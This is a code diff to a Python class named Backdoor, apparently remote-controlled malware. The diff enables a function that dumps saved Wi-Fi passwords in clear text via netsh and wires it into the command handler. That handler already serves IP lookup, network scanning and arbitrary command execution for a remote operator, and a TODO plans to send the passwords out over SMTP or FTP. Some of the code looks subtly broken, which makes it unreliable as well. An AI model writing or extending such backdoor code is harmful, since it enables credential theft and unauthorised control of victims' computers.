@@ -56,21 +56,17 @@ class Backdoor():
         private = ip
         pub = re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
         return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}", private, pub
-    # def get_wifi():
-    #     #Get all saved wifi Bitch
-    #     data = os.popen("netsh wlan show profiles").read()
-    #     wifi = re.compile("All User Profile\s*:.(.*)")
-    #     ssid = wifi.findall(data)
-    #     try:
-    #         wlan = os.popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()
-
-    #         pass_regex = re.compile("Key Content\s*:.(.*)")
-            
-    #         return pass_regex.search(wlan).group(1)
-        
-    #     except:
-        
-    #         return " "
+    def get_wifi():
+        # wifi clear pass
+        data = os.popen("netsh wlan show profiles").read()
+        wifi = re.compile("All User Profile\s*:.(.*)")
+        ssid = wifi.findall(data)
+        try:
+            wlan = subprocess.Popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()
+            pass_regex = re.compile("Key Content\s*:.(.*)")
+            return pass_regex.search(wlan).group(1)
+        except:
+            return " "
     #TODO: send the wifi passes through smtp or ftp or maybe read them dynamicly
 
     def arp_scan(self):
@@ -131,8 +127,8 @@ class Backdoor():
                     cmd_rslt = self.get_ip
                 elif rcvd_cmd[0] == "scan":
                     cmd_rslt = self.scan_result
-                # elif rcvd_cmd[0] == "get_wifi":
-                    # cmd_rslt = self.get_wifi
+                elif rcvd_cmd[0] == "get_wifi":
+                    cmd_rslt = self.get_wifi
                 else:
                     cmd_rslt = self.exec_command(rcvd_cmd)
             except Exception as e :
